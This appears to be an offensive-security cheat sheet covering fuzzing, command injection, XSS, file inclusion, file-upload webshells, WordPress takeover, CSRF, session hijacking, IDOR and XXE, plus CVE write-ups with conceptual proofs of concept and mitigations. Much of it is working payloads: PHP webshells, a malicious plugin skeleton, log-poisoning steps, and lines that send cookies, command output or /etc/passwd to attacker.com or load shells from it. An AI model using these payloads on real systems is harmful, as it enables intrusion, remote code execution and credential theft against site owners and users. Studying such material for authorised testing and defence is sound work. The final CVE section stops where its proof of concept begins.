docs.title: Methodology
docs.text:
Every writeup follows a consistent structure:

  1. Reconnaissance — port scan, service enumeration, OSINT
  2. Foothold — vulnerability identification and initial shell
  3. Enumeration — internal discovery, credential hunting
  4. Privilege escalation — sudo, SUID, cron, kernel, token abuse
  5. Flags — proof screenshots and hashes

docs.title: Attacking Web Applications with Ffuf
docs.text: Fast web fuzzer written in Go. Used for directory discovery, parameter fuzzing, vhost enumeration, and filter bypass.

docs.title: Core Usage
docs.text:
# Directory fuzzing
ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

# Extension fuzzing
ffuf -u http://TARGET/indexFUZZ -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt

# Page fuzzing (with extension)
ffuf -u http://TARGET/FUZZ.php -w wordlist.txt

# Recursive fuzzing
ffuf -u http://TARGET/FUZZ -w wordlist.txt -recursion -recursion-depth 2

# Subdomain/vhost fuzzing
ffuf -u http://TARGET -H "Host: FUZZ.target.com" -w subdomains.txt

# GET parameter fuzzing
ffuf -u "http://TARGET/page.php?FUZZ=value" -w params.txt

# POST data fuzzing
ffuf -u http://TARGET/login -X POST -d "user=admin&pass=FUZZ" -w passwords.txt -H "Content-Type: application/x-www-form-urlencoded"

docs.title: Filtering Results
docs.text:
# Filter by response code
ffuf ... -fc 404

# Filter by size
ffuf ... -fs 1234

# Filter by word count
ffuf ... -fw 10

# Match specific codes only
ffuf ... -mc 200,301,302

# Filter by regex in response
ffuf ... -fr "Not Found"

docs.title: Broken Authentication
docs.text: Vulnerabilities in authentication mechanisms that allow attackers to compromise accounts, bypass login, or impersonate other users.

docs.title: Common Vulnerabilities
docs.text: Vulnerability Description Weak passwords No complexity requirements, default creds No rate limiting Enables brute force Predictable tokens Guessable session IDs or password reset tokens Insecure "remember me" Long-lived tokens stored insecurely 2FA bypass OTP reuse, missing validation, response manipulation Username enumeration Different response for valid vs invalid username Password reset flaws Predictable token, no expiry, host header injection

docs.title: Username Enumeration
docs.text:
# Different responses reveal valid usernames
curl -s -o /dev/null -w "%{http_code} %{size_download}" http://target/login -d "user=admin&pass=wrong"
curl -s -o /dev/null -w "%{http_code} %{size_download}" http://target/login -d "user=invalid&pass=wrong"

# Timing differences
time curl -s http://target/login -d "user=admin&pass=wrong"
time curl -s http://target/login -d "user=notexist&pass=wrong"

docs.title: 2FA Bypass
docs.text:
1. Response manipulation: change {"success":false} to {"success":true}
2. Try OTP 000000–999999 if no rate limit (6-digit = 1M combos)
3. Reuse OTP from own account if same algorithm
4. Skip 2FA step entirely by jumping directly to post-2FA URL
5. Modify userId parameter during 2FA to another user

docs.title: Password Reset Attacks
docs.text:
# Host header injection → steal reset token
POST /reset-password HTTP/1.1
Host: attacker.com    # Token sent to this domain if not validated

# Predictable token
# token=base64(email+timestamp) → forge for any user

# Token not expiring → reuse old reset links from email

docs.title: Bug Bounty Hunting Process
docs.text: Structured approach to bug bounty hunting — from program selection and scope analysis to report writing and submission.

docs.title: Program Selection
docs.text:
Platforms:
- HackerOne     → enterprise programs, high payouts
- Bugcrowd      → many programs, tiered rewards
- Intigriti     → European companies
- YesWeHack     → European focus
- Immunefi      → Web3 / blockchain, very high payouts

Criteria for picking a program:
- Wide scope (*.target.com beats target.com/page only)
- High average bounty
- Active triage (fast response time)
- Hall of fame or reputation points

docs.title: Scope Analysis
docs.text:
# Extract all domains from scope
# In-scope: *.example.com, api.example.com, *.staging.example.com
# Out-of-scope: test.example.com, admin.example.com (explicitly excluded)

# Rules:
# - Never test out-of-scope assets
# - Check if rate limiting is permitted
# - Check if automated scanning is allowed
# - Confirm if third-party integrations are in scope

docs.title: Recon Checklist
docs.text:
1. Subdomain enumeration (subfinder, amass, crt.sh)
2. Port scan on discovered hosts (nmap)
3. Directory brute force (ffuf, dirsearch)
4. Technology fingerprint (whatweb, wappalyzer)
5. JavaScript analysis (find endpoints, tokens, APIs)
6. Google dorking (site:target.com filetype:pdf inurl:admin)
7. GitHub leaks (github.com/search?q=target.com)
8. Shodan/Censys passive scan

docs.title: Vulnerability Assessment Priority
docs.text:
P1 (Critical) → RCE, SQLi with data exfil, Auth bypass admin, Account takeover
P2 (High)     → SQLi read-only, SSRF internal, XSS stored on sensitive page
P3 (Medium)   → CSRF on critical function, IDOR limited scope, Open redirect
P4 (Low)      → Self-XSS, info disclosure (stack trace, version headers)
P5 (Info)     → Missing security headers, content type sniffing

docs.title: Report Writing
docs.text:
# Bug Report Template

**Vulnerability:** [Type] in [Endpoint]
**Severity:** Critical / High / Medium / Low
**CVSS Score:** 9.8 (example)
**CWE:** CWE-89 (SQL Injection)

## Summary
One paragraph — what the bug is and what impact it has.

## Steps to Reproduce
1. Navigate to https://target.com/login
2. Enter `' OR 1=1-- -` in the username field
3. Observe authentication bypass

## Impact
Describe what an attacker can do. Be specific. Include actual exfiltrated data (sanitized).

## Proof of Concept
[Screenshot or video]
[curl command that reproduces the bug]

## Recommended Fix
Parameterized queries / input validation / etc.

docs.title: Responsible Disclosure
docs.text:
• Report before public disclosure
  • Give vendor reasonable time to fix (90 days standard)
  • Don't access/exfiltrate user data beyond proving the vulnerability
  • Don't perform DoS or destructive tests

docs.title: Command Injections
docs.text: OS command injection occurs when user input is passed unsanitized to a shell function. Leads to arbitrary command execution on the server.

docs.title: Injection Operators
docs.text: Operator Behavior ; Run second command regardless of first result \| Pipe stdout of first to second \|\| Run second only if first fails && Run second only if first succeeds \n %0a Newline — often treated as command separator `cmd` Command substitution $(cmd) Command substitution

docs.title: Basic Payloads
docs.text:
# Test injection
; id
| id
&& id
`id`
$(id)

# Blind injection (time-based)
; sleep 5
| sleep 5
$(sleep 5)

# Blind injection (OOB)
; curl http://attacker.com/$(id)
; nslookup $(id).attacker.com

docs.title: Filter Bypass
docs.text:
# Space bypass
${IFS}                   # Internal Field Separator
{ls,-la}                 # No spaces needed
cmd<tab>arg              # Tab as separator

# Slash bypass
${PATH:0:1}              # Equals /

# Blacklist bypass
w'h'o'a'm'i             # Broken by quotes → whoami
w"h"o"a"m"i             # Same with double quotes

# Encoding
$(printf '\x77\x68\x6f\x61\x6d\x69')   # hex → whoami

# Case (Windows)
wHoAmI

docs.title: Cross-Site Scripting (XSS)
docs.text: XSS allows injection of malicious scripts into pages viewed by other users. Impacts range from session theft to full account takeover.

docs.title: Types
docs.text: Type Persistence Execution Reflected None URL parameter reflected in response Stored Database Saved and served to all users DOM-Based None Manipulates client-side DOM via JS

docs.title: Detection Payloads
docs.text:
// Basic alert test
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>

// Event handler injection
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

// Without parentheses (filter bypass)
<script>alert`1`</script>

// javascript: URI
<a href="javascript:alert(1)">click</a>

fetch('https://attacker.com/?c='+document.cookie)
</script>

docs.title: File Inclusion
docs.text: Local File Inclusion (LFI) and Remote File Inclusion (RFI) occur when user input is used to build a file path for include(), require(), or similar functions without proper sanitization.

docs.title: LFI Detection
docs.text:
# Basic path traversal
/etc/passwd
../../../etc/passwd
....//....//....//etc/passwd   # filter bypass double-dot

# Windows
..\..\..\..\Windows\System32\drivers\etc\hosts
C:\Windows\System32\drivers\etc\hosts

docs.title: LFI PHP Wrappers
docs.text:
# Read PHP source (base64 encoded)
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.toupper/resource=index.php

# Execute arbitrary code
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4=
# (base64 of: <?php system($_GET["cmd"]); ?>)

# Read stdin
php://input

docs.title: Log Poisoning → RCE
docs.text:
# 1. Inject PHP into User-Agent (poisons access.log)
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target/

# 2. Include the log
http://target/?page=../../../../var/log/apache2/access.log&cmd=id

# Common log locations
/var/log/apache2/access.log
/var/log/nginx/access.log
/proc/self/fd/2           # stderr

docs.title: RFI
docs.text:
# Requires allow_url_include = On in php.ini
http://target/?page=http://attacker.com/shell.php
http://target/?page=ftp://attacker.com/shell.php

# Host a PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 80

docs.title: /proc/self Tricks
docs.text:
/proc/self/environ    # environment variables (may contain User-Agent)
/proc/self/fd/0       # stdin
/proc/self/cmdline    # process arguments

docs.title: File Upload Attacks
docs.text: Exploiting insecure file upload functionality to upload malicious files — typically a webshell — for remote code execution.

docs.title: Webshell Payloads
docs.text:
<!-- Minimal PHP webshell -->
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>

<!-- With output formatting -->
<?php echo '<pre>' . system($_GET['cmd']) . '</pre>'; ?>

docs.title: Extension Bypass Techniques
docs.text:
# Double extension
shell.php.jpg
shell.php.png

# Case variation
shell.PHP
shell.PhP

# Null byte (older PHP)
shell.php%00.jpg

# Special PHP extensions
shell.php3
shell.php4
shell.php5
shell.phtml
shell.phar

# MIME type bypass (change Content-Type in request)
Content-Type: image/jpeg

docs.title: Magic Bytes Bypass
docs.text:
Add image magic bytes before PHP code to fool MIME checks:

# JPEG magic bytes
FF D8 FF E0   followed by PHP payload

# PNG magic bytes
89 50 4E 47

# Using exiftool to inject into real image
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.jpg.php

docs.title: Hacking WordPress
docs.text: WordPress is the world's most deployed CMS and a frequent target. Vulnerabilities commonly arise from outdated plugins, themes, and weak credentials.

docs.title: Enumeration
docs.text:
# WPScan — full scan
wpscan --url http://target/ --enumerate u,p,t,cb,dbe

# Enumerate users only
wpscan --url http://target/ --enumerate u

# Enumerate plugins (aggressive)
wpscan --url http://target/ --enumerate p --plugins-detection aggressive

# Brute force credentials
wpscan --url http://target/ -U users.txt -P /usr/share/wordlists/rockyou.txt

# Manual user enumeration via author ID
curl http://target/?author=1
curl http://target/wp-json/wp/v2/users

docs.title: Interesting Files
docs.text:
/wp-login.php          # Admin login
/wp-admin/             # Dashboard
/wp-config.php         # DB credentials (not directly readable via web)
/wp-content/plugins/   # Plugin code
/wp-content/uploads/   # Uploaded files
/xmlrpc.php            # Legacy API (enables brute force in one request)

docs.title: RCE via Theme Editor
docs.text:
1. Login to /wp-admin/
  2. Appearance → Theme Editor
  3. Edit 404.php or functions.php
  4. Insert: <?php system($_GET['cmd']); ?>
  5. Visit http://target/wp-content/themes/<theme>/404.php?cmd=id

docs.title: RCE via Plugin Upload
docs.text:
1. Login → Plugins → Add New → Upload Plugin
  2. Upload a ZIP containing a malicious .php file
  3. Activate the plugin
  4. Trigger the shell at /wp-content/plugins/<plugin>/shell.php?cmd=id

docs.title: Malicious Plugin Skeleton
docs.text:
<?php
/*
Plugin Name: Shell
Version: 1.0
*/
system($_GET['cmd']);

zip plugin.zip shell.php

docs.title: xmlrpc.php Brute Force
docs.text:
import requests

target = "http://target/xmlrpc.php"
payload = """<?xml version="1.0"?>
<methodCall><methodName>wp.getUsersBlogs</methodName>
<params>
  <param><value><string>admin</string></value></param>
  <param><value><string>PASSWORD</string></value></param>
</params></methodCall>"""

r = requests.post(target, data=payload)
print(r.text)

docs.title: Information Gathering - Web Edition
docs.text: Passive and active recon techniques for web targets — DNS, WHOIS, subdomain enumeration, fingerprinting, and crawling.

docs.title: Passive Recon (no direct contact with target)
docs.text:
# WHOIS
whois target.com

# DNS records
dig target.com ANY
dig target.com MX
dig target.com NS
nslookup -type=any target.com

# Reverse DNS
dig -x <IP>

# Certificate transparency (subdomains)
curl "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u

# Google dorks
site:target.com
site:target.com filetype:pdf
site:target.com inurl:admin
cache:target.com

docs.title: Subdomain Enumeration
docs.text:
# Passive — via APIs (no DNS queries)
subfinder -d target.com
amass enum -passive -d target.com
assetfinder target.com

# Active — DNS brute force
ffuf -u http://FUZZ.target.com -H "Host: FUZZ.target.com" -w subdomains.txt -mc 200,301,302
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

docs.text: Foundational concepts behind how web applications work — HTTP, HTML, JavaScript, cookies, and web architecture.

docs.title: HTTP Basics
docs.text:
# Request structure
GET /index.php?id=1 HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0
Cookie: session=abc123
Accept: text/html

# Response structure
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: session=abc123; HttpOnly; Secure
Content-Length: 1234

docs.title: Important HTTP Methods
docs.text: Method Use GET Retrieve data (params in URL) POST Send data (body) PUT Create/update resource DELETE Delete resource OPTIONS List allowed methods HEAD Same as GET but no body PATCH Partial update

docs.title: Security-Relevant Headers
docs.text: Header Purpose Content-Security-Policy Restricts script/resource sources X-Frame-Options Prevents clickjacking X-XSS-Protection Legacy XSS filter Strict-Transport-Security Forces HTTPS Access-Control-Allow-Origin CORS policy HttpOnly cookie flag Cookie not accessible via JS Secure cookie flag Cookie only over HTTPS SameSite cookie flag CSRF protection

docs.title: Common Status Codes
docs.text: Code Meaning 200 OK 301/302 Redirect 401 Unauthorized (needs auth) 403 Forbidden (has auth, no access) 404 Not Found 500 Server Error

docs.title: Frontend vs Backend
docs.text:
Frontend (runs in browser):
  HTML → structure
  CSS  → presentation
  JS   → behavior, AJAX, DOM manipulation

Backend (runs on server):
  PHP, Python, Ruby, Java, Node.js
  Databases: MySQL, PostgreSQL, MSSQL, MongoDB
  Application logic, auth, data processing

docs.title: JavaScript Deobfuscation
docs.text: Techniques for reversing obfuscated JavaScript to discover hidden functionality, API keys, hardcoded credentials, and logic flaws.

docs.title: Common Obfuscation Methods
docs.text: Method Description Minification Whitespace and variable names stripped Packing (eval/p,a,c,k,e,d) Code compressed into eval string Encoding base64, hex, unicode escapes String splitting "hel"+"lo" Character code String.fromCharCode(72,101,108,108,111)

docs.title: Deobfuscation Tools
docs.text:
# Online
# https://beautifier.io       — format and indent minified JS
# https://obf-io.deobfuscate.io — automated deobfuscation
# https://deobfuscate.relative.im — handles eval/packer
# https://www.dcode.fr/javascript-unobfuscator

# Browser DevTools
# F12 → Sources → Pretty print {} button
# F12 → Console → paste code, call eval manually

# Node.js
node -e "eval(require('fs').readFileSync('obf.js','utf8'))"

docs.title: Manual Techniques
docs.text:
// Replace eval with console.log to see decoded string
eval(function(p,a,c,k,e,d){...})
// → change eval to console.log:
console.log(function(p,a,c,k,e,d){...})

// Decode base64
atob("aGVsbG8=")                   // browser console
echo "aGVsbG8=" | base64 -d       // bash

// Decode hex string
"\x68\x65\x6c\x6c\x6f"            // → "hello" in browser console

// fromCharCode array
String.fromCharCode(72,101,108,108,111)   // → "Hello"

docs.title: Finding Secrets
docs.text:
# Extract strings from JS file
strings script.js | grep -iE "api|key|token|secret|pass|auth"

# Search for interesting patterns
grep -E "(api_key|apiKey|access_token|secret|password)\s*[:=]" *.js

# Download all JS files from page

docs.title: Session Security
docs.text: Session management vulnerabilities allow attackers to steal, forge, or hijack user sessions — leading to account takeover.

docs.title: CSRF (Cross-Site Request Forgery)
docs.text:
Tricks authenticated users into submitting malicious requests to a target site.

<!-- Victim visits attacker page, triggers request to bank -->
<img src="https://bank.com/transfer?to=attacker&amount=1000">

<!-- Form-based CSRF -->
<form action="https://target.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>

Bypass CSRF protections: 

- Remove CSRF token entirely → may still work
- Use another user's valid CSRF token (if not tied to session)
- Change request method: POST → GET
- Change Content-Type: application/json → text/plain

docs.title: Session Hijacking
docs.text:
# Steal session cookie via XSS
<script>document.location='http://attacker.com/?c='+document.cookie</script>

# Set stolen cookie in browser
document.cookie = "PHPSESSID=stolen_value; path=/"

# Or use curl
curl -b "PHPSESSID=stolen_value" http://target.com/profile

docs.title: Cookie Attributes
docs.text: Flag Bypass Risk No HttpOnly Cookie readable via document.cookie (XSS can steal it) No Secure Cookie transmitted over HTTP (MitM can steal it) No SameSite Cookie sent cross-site (CSRF works) SameSite=Lax Only blocks cross-site POST CSRF SameSite=Strict Full protection against CSRF

docs.title: Session Fixation
docs.text:
1. Attacker obtains a valid session ID (e.g., unauthenticated)
2. Tricks victim into using that session ID
3. Victim authenticates — if server doesn't regenerate session, attacker owns it

Detection: is session ID the same before and after login?

docs.title: IDOR (Insecure Direct Object Reference)
docs.text:
Access unauthorized resources by modifying object identifiers in requests.

# Change user ID in URL
GET /api/users/1/profile   → GET /api/users/2/profile

# Change ID in body
{"user_id": 1}             → {"user_id": 2}

# Change in cookie
Cookie: user_id=1          → Cookie: user_id=2

# Indirect IDOR — hashed IDs
# Predict hash: MD5/SHA1 of numeric ID
echo -n "2" | md5sum

# Mass enumeration via ffuf
ffuf -u http://target.com/api/user/FUZZ -w ids.txt -mc 200
seq 1 1000 > ids.txt

docs.title: XXE (XML External Entity)
docs.text:
<!-- Basic file read -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>

<!-- OOB exfiltration (when response doesn't reflect content) -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<data>anything</data>

<!-- evil.dtd on attacker server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%oob;

<!-- SVG XXE (file upload) -->
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg>&xxe;</svg>

docs.title: Bandit
docs.text:
Difficulty: Beginner | Topics: Linux CLI, SSH, file permissions, scripting, encoding

The entry point for OverTheWire. Teaches essential Linux command-line skills used in every other wargame and real pentest.

# Password: bandit0
# Next level password stored somewhere on the system

Each level's password is stored in /etc/bandit_pass/banditN — only readable by that user.

docs.title: Behemoth
docs.text:
Difficulty: Intermediate | Topics: Buffer overflows, format strings, symbolic links, environment variables, command injection

Eight levels of binary and filesystem exploitation. Programs have SUID bits set — exploiting them grants access to the next level's credentials.

docs.title: Concepts
docs.text: Level Technique 0 Hardcoded password — ltrace reveals strcmp 1 Buffer overflow — EIP control 2 Symlink attack — predictable temp file 3 Format string — info leak 4 Buffer overflow with environment variable shellcode 5 Network socket + hardcoded logic 6 Shellcode in environment, ltrace bypass 7 Format string — arbitrary write to GOT

# Observe binary behavior
ltrace /behemoth/behemoth0
strace /behemoth/behemoth0 2>&1 | grep -E "open|read|write"

# Symlink attack
ln -s /etc/behemoth_pass/behemothN /tmp/predictable_tempfile

# Environment shellcode
export SHELLCODE=$(python3 -c "print('\x90'*100 + shellcode)")

docs.text:
Difficulty: Hard | Topics: Advanced binary exploitation — ROP, heap, kernel modules, race conditions

One of the harder OverTheWire wargames. Combines multiple exploitation techniques including return-oriented programming and complex memory corruption chains.

docs.title: CVE-2021-48014 — FineReport 9.0: Unauthenticated Remote Code Execution via Path Traversal
docs.text: Field Value Severity Critical — CVSS 9.8 (v3.x) Product FineReport 9.0 — enterprise reporting / business-intelligence platform Type Path traversal (CWE-22) in the SVG save operation leading to arbitrary file write and remote code execution Vector Unauthenticated attacker POSTs directory-traversal sequences in the filePath parameter plus a payload in __CONTENT__ → server writes the content outside the intended folder (a JSP webshell in the web root) → visiting the file executes it

docs.title: Affected versions
docs.text: FineReport 9.0 (design_save_svg / report-server SVG save operation). Fixed in patched releases after 9.0.

docs.title: Root cause
docs.text:
The report server's SVG save handler takes a caller-supplied filePath, joins it to an upload directory, and writes the caller's __CONTENT__ payload there — without canonicalizing the path or rejecting ../ sequences. Traversal escapes the upload folder, so the attacker chooses both the destination (e.g. inside the web root) and the content (a JSP webshell). Writing executable content into the web root turns file-write into remote code execution.

# Simplified vulnerable pattern
def save_svg_vulnerable(file_path, content):
    dest = os.path.join(UPLOAD_DIR, file_path)   # BUG: '../' escapes UPLOAD_DIR
    open(dest, "w").write(content)               # attacker writes a JSP webshell

# Simplified fixed pattern
def save_svg_fixed(file_path, content):
    dest = os.path.realpath(os.path.join(UPLOAD_DIR, file_path))
    if not dest.startswith(os.path.realpath(UPLOAD_DIR) + os.sep):
        raise ValueError("path escapes the upload directory")
    open(dest, "w").write(content)

Shadowserver observed this vulnerability being exploited in the wild on 2023-10-14.

docs.title: Proof of concept (conceptual)
docs.text:
1. Attacker POSTs to the report server's SVG save operation — no login, no account.
  2. The filePath parameter carries ../ sequences climbing out of the upload folder.
  3. The __CONTENT__ parameter carries a JSP webshell payload.
  4. The server writes the payload to the attacker-chosen location inside the web root.
  5. Attacker requests the planted file — it executes, yielding a remote shell.

The accompanying poc.py demonstrates the pattern safely: naive path joining (vulnerable) vs. canonicalize-and-confine (fixed), on a local temp directory. Offline, no server, no exploit.

docs.title: Mitigation
docs.text:
• Patch or upgrade FineReport past 9.0 — the fixed version confines the save operation to its folder.
  • Hunt for implants: search the web root for unknown JSP files and recently modified pages.
  • Review access logs for suspicious requests to the SVG save operation.
  • Restrict ReportServer exposure: put it behind authentication, a VPN, or a private network — not the open internet.
  • Rotate credentials if the server was exposed.

docs.title: References
docs.text:
• https://nvd.nist.gov/vuln/detail/CVE-2021-48014
  • https://cwe.mitre.org/data/definitions/22.html

docs.title: CVE-2021-48016 — DedeCMS: Unauthenticated Remote Code Execution via Referer Header Injection
docs.text: Field Value Severity Critical — CVSS 9.8 (v3.x) Product DedeCMS through 5.8.1-beta — one of the most widely used content management systems in China Type PHP code injection (CWE-94) — attacker-controlled HTTP Referer written into a template string and included Vector Unauthenticated attacker sends a crafted Referer header to the link-saving endpoint → header is embedded in a DedeTemplate → template inclusion executes it as PHP → arbitrary PHP code and system command execution

docs.title: Affected versions
docs.text: DedeCMS through 5.8.1-beta. Fixed in releases after 5.8.1-beta.

docs.title: Root cause
docs.text:
DedeCMS's message-display routine (ShowMsg()) copies the raw HTTP_REFERER header into a template string built for the DedeTemplate engine, without sanitizing or encoding it. Because DedeTemplate templates are included — and include executes embedded PHP — the header becomes executable code. An attacker simply sends a request whose Referer contains PHP, and the server runs it.

// Simplified vulnerable pattern
function show_msg($msg) {
    $referer = $_SERVER['HTTP_REFERER'];              // attacker-controlled
    $template = "<div>Back to: $referer</div>";       // BUG: raw header in template
    render_dede_template($template);                  // template is include()d -> PHP executes
}

// Simplified fixed pattern
function show_msg_fixed($msg) {
    $referer = htmlspecialchars($_SERVER['HTTP_REFERER']);  // encode before templating
    $template = "<div>Back to: $referer</div>";
    render_dede_template($template);                        // now inert text
}

Shadowserver observed this vulnerability being exploited in the wild on 2023-10-14.

docs.title: Proof of concept (conceptual)
docs.text:
1. Attacker crafts a Referer header containing PHP code.
  2. The request reaches the link-saving endpoint with an empty validation code.
  3. The message routine writes the raw header into the template string.
  4. The template engine includes the string — the PHP executes server-side.
  5. Attacker gains arbitrary command execution, then plants a persistent webshell.

The accompanying poc.py demonstrates the pattern safely: header text interpolated into an executable template (vulnerable) vs. encoded first (fixed). Offline, no server, no exploit.

docs.title: Mitigation
docs.text:
• Upgrade immediately to a DedeCMS release newer than 5.8.1-beta. There is no workaround — patching is the fix.
  • Assume compromise on any internet-exposed instance: hunt for unknown webshells, backdoors, and recently modified files.
  • Rotate every credential the server touched (database, admin, SSH keys).
  • Rebuild from clean backups if you find signs of tampering.

docs.title: References
docs.text:
• https://nvd.nist.gov/vuln/detail/CVE-2021-48016
  • https://cwe.mitre.org/data/definitions/94.html

docs.title: CVE-2022-51021 — NotificationX WordPress plugin unauthenticated SQL injection
docs.text: Severity Product Type Vector HIGH 8.8 NotificationX for WordPress SQL injection (CWE-89) Network

docs.title: Affected versions
docs.text: NotificationX 2.0.0 through 2.3.11 (fixed in 2.3.12).

docs.title: Root cause
docs.text: The public REST endpoint /wp-json/notificationx/v1/notification/{id} accepts the id parameter in array form (e.g. id[1]). Attacker-controlled values flow unsanitized into Database::get_where_query(), which interpolates them into the SQL statement. The endpoint's api_key is derived from md5(home_url()) — public information — so no real authentication stands in the way. The injection is time-based blind: SLEEP() payloads let an unauthenticated attacker extract table names, user accounts, and hashed passwords bit by bit.

docs.title: Proof of concept (conceptual, educational only)
docs.text:
Educational purposes only. This demonstrates the pattern of the flaw — string-interpolated SQL vs. a parameterized query — on a local throwaway database. No real target, no real exploit.

# sqli_pattern_demo.py — the vulnerable pattern vs the fix (local sqlite only)
import sqlite3

db = sqlite3.connect(":memory:")
db.execute("CREATE TABLE notifications (id INTEGER, title TEXT)")
db.execute("INSERT INTO notifications VALUES (1, 'Sale popup')")

def get_where_query_vulnerable(user_id: str):
    # What the plugin effectively did: raw input glued into SQL
    return f"SELECT * FROM notifications WHERE id = {user_id}"

def get_where_query_fixed(user_id: str):
    cur = db.execute("SELECT * FROM notifications WHERE id = ?", (user_id,))
    return cur.fetchall()

attacker = "1 OR (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END) -- "
print("Vulnerable query would become:", get_where_query_vulnerable(attacker))
print("Fixed query returns:", get_where_query_fixed(attacker))  # [] — treated as data

docs.title: Mitigation
docs.text:
• Update NotificationX to 2.3.12 or later immediately.
  • Audit the WordPress database for tampering: new admin users, altered options, unknown tables.
  • Rotate database credentials and WordPress salts.
  • Put a web application firewall in front of /wp-json/ endpoints.
  • Never build SQL by interpolating request input — use prepared statements with bound parameters.

docs.title: CVE-2026-102438 — ASUS Armoury Crate: Uncontrolled Search Path → SYSTEM via DLL Hijacking
docs.text: Field Value Severity High — CVSS 8.5 Product ASUS Armoury Crate (Windows) — high-privilege background service Type Uncontrolled search path element (CWE-427) Vector Local, low complexity, low privileges, no user interaction → any local user replaces a DLL loaded by a SYSTEM-privileged process and gains arbitrary code execution as SYSTEM

docs.title: Affected versions
docs.text: • ASUS Armoury Crate (current versions; October 2026 advisory). ASUS recommends updating to the latest build via the in-app Update Center — see the ASUS Security Advisory for the fixed versions.

docs.title: Root cause
docs.text:
A high-privilege Armoury Crate process loads a dynamic-link library by its bare file name instead of an absolute path. Windows resolves that name by searching a sequence of folders — and any folder on that search path that a local user can write to becomes a weapon: drop a malicious DLL with the same name there and the SYSTEM process loads your code.

# Simplified vulnerable pattern
load_library("helper.dll")     # Windows searches folders...
                               # attacker-writable folder wins

# Simplified fixed pattern
load_library("C:\\Program Files\\ASUS\\...\\helper.dll")  # one exact path
set_dll_directory("")           # safe search mode: no CWD, no PATH lookup

docs.title: Proof of concept (conceptual)
docs.text:
1. The attacker finds a writable folder on the DLL search path of the privileged service.
  2. They drop a malicious DLL with the exact name the service loads.
  3. When the Armoury Crate service starts (or restarts), it loads the attacker's DLL as SYSTEM.
  4. Arbitrary code executes with full machine privileges — persistence, credential dumping, defense evasion.

The accompanying poc.py demonstrates the pattern safely: a loader that searches a path list versus one that pins an absolute path, against purely synthetic offline directories. Fully offline, synthetic data — no exploit, no system changes.

docs.title: Mitigation
docs.text:
• Update Armoury Crate now: open the app → Update Center → Check for Updates and install the October 2026 security update.
  • Don't need it? Uninstall it. Fewer privileged background services = smaller attack surface.
  • For developers: always load libraries by absolute path, enable SafeDllSearchMode, and sign/hash-verify binaries before loading.
  • Hunt: on managed fleets, look for unsigned DLLs loading inside ASUS service processes.

docs.title: CVE-2026-102503 — Google SAM: Two Open Doors Into the Agent Mesh (Auth Bypass)
docs.text:
Field Value Severity Critical — CVSS 9.8 Product google/sam — Sovereign Agent Mesh (SAM), 0.1.0-alpha.1 through 0.1.0-alpha.8 Type Missing Authentication for Critical Function (CWE-306); Missing Authorization (CWE-862); Initialization with Insecure Default (CWE-1188) Vector Unauthenticated, network → unauthorized tool execution / full mesh compromise

This writeup covers two CVEs published together against the same product:

CVE Issue CVE-2026-102503 Critical 9.8 — the /libp2p-http ingress server (StartIngressServer in cmd/sam-node/node.go) exposes every registered backend service with no authorization check. Any peer that can dial the node invokes arbitrary backends (command/stdio MCP servers, A2A, inference) — the parallel MCP-protocol path enforces biscuit auth, the ingress skips it entirely. Fixed in v0.1.0-alpha.3. CVE-2026-103091 The MCP proxy and OIDC registration flow (HandleStreamPassThrough in mcp_service.go; GET /info and POST /register in internal/controlplane/server.go) let a remote attacker self-enroll into the mesh and invoke arbitrary tools on every connected node. /info publicly discloses the OIDC config, /register auto-enrolls any valid OIDC token with no claim filtering or ban check, and the shipped default policy binds sam:system:authenticated to allowed_services: ["*"]. Fixed in v0.1.0-alpha.9.

docs.title: Affected versions
docs.text:
• CVE-2026-102503: SAM 0.1.0-alpha.1 through 0.1.0-alpha.2. Fixed in v0.1.0-alpha.3.
  • CVE-2026-103091: SAM 0.1.0-alpha.1 through 0.1.0-alpha.8. Fixed in v0.1.0-alpha.9.

docs.title: Root cause
docs.text:
The mesh has one real security boundary — biscuit capability tokens checked by WithBiscuitAuth → Authorize — but it is wired to exactly one path: the MCP protocol stream handler (api.MCPProtocolID). The second, parallel ingress (/libp2p-http) calls the same backend handlers with no Authorize, no biscuit, no auth frame anywhere in the code path. The connection gater only blocks banned/revoked peers, and TLS only proves a peer owns a keypair — neither proves membership.

// Simplified vulnerable pattern (cmd/sam-node/node.go)
node.Host.SetStreamHandler(api.MCPProtocolID,
    node.WithBiscuitAuth(node.HandleMCPStream))  // gated
// ...
server := &http.Server{Handler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
    svc, ok := n.services.Get(serviceName)
    svc.Handler().ServeHTTP(w, r)  // <-- reached with NO authorization
})}

For CVE-2026-103091, the enrollment side is the weak link: GET /info leaks the OIDC issuer/client config to anyone, POST /register mints a 90-day mesh credential for any valid OIDC token (no email/domain/claim filtering, no ban check — bans are keyed on a regenerable peer_id), and the default policy grants every authenticated member allowed_services: ["*"], making the service-level biscuit check meaningless.

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain for CVE-2026-102503:

